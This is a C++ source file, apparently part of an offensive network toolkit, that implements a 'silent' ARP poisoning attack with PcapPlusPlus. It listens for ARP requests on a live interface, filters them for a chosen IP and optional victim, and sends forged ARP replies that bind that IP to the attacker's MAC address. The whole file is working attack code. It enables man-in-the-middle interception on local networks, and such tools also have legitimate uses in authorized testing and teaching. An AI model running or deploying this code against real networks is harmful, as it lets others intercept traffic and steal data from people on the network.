#include "arp_poisoning/silent.h"
#include "ArpLayer.h"
#include "EthLayer.h"
#include "Packet.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include "log.h"
#include <future>
#include <stdexcept>

void ATK::ARP::SilentArpPoisoningStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void * /*cookie*/) {
    // currently unused, no termination condition
    // auto *completionFuture = static_cast<std::promise<void> *>(cookie);

    pcpp::Packet parsedPacket(packet);
    auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
    auto *requestArpLayer = parsedPacket.getLayerOfType<pcpp::ArpLayer>();

    if (requestEthLayer == nullptr || requestArpLayer == nullptr) {
        device->stopCapture();
        device->close();
        LOG_ERROR(
            "Inavlid filter configuration, found packets wiht missing layers");
        throw std::runtime_error(
            "Invalid filter settings, found packet with missing layers");
    }

    // determine whether or not to handle packet
    if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
         requestEthLayer->getSourceMac() == attackerMac_) ||
        (requestArpLayer->getTargetIpAddr() != ipToSpoof_ ||
         requestArpLayer->getTargetIpAddr() == device->getIPv4Address()) ||
        (victimIp_.has_value() &&
         requestArpLayer->getSenderIpAddr() != victimIp_.value())) {
        LOG_INFO("skipped packet");
        return;
    }

    // craft response packet
    pcpp::EthLayer responseEthLayer(device->getMacAddress(),
                                    requestEthLayer->getSourceMac());

    pcpp::ArpLayer responseArpLayer(pcpp::ArpOpcode::ARP_REPLY, attackerMac_,
                                    requestArpLayer->getSenderMacAddress(),
                                    requestArpLayer->getTargetIpAddr(),
                                    requestArpLayer->getSenderIpAddr());

    pcpp::Packet responsePacket(ARP_PACKET_SIZE);
    responsePacket.addLayer(&responseEthLayer);
    responsePacket.addLayer(&responseArpLayer);
    responsePacket.computeCalculateFields();

    if (!device->sendPacket(&responsePacket)) {
        LOG_ERROR("Failed to send packet");
        throw std::runtime_error("Failed to send packet");
    };
}

void ATK::ARP::SilentArpPoisoningStrategy::execute() {
    if (!device_->open()) {
        throw std::runtime_error("Unable to open interface");
    }

    std::promise<void> completionPromise;
    std::future<void> completionFuture = completionPromise.get_future();

    // set filters
    pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
    pcpp::EtherTypeFilter etherTypeFilter(PCPP_ETHERTYPE_ARP);
    pcpp::AndFilter andFilter;
    andFilter.addFilter(&arpFilter);
    andFilter.addFilter(&etherTypeFilter);

    if (!device_->setFilter(andFilter)) {
        device_->close();
        LOG_ERROR("Unable to set arp and ethertype filters on interface");
        throw std::runtime_error(
            "Unable to set arp and ethertype filters on interface");
    };

    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();

        LOG_ERROR("Unable to start capturing arp packets");
        throw std::runtime_error("Unable to start capturing arp packets");
    };

    completionFuture.wait();

    device_->close();
}
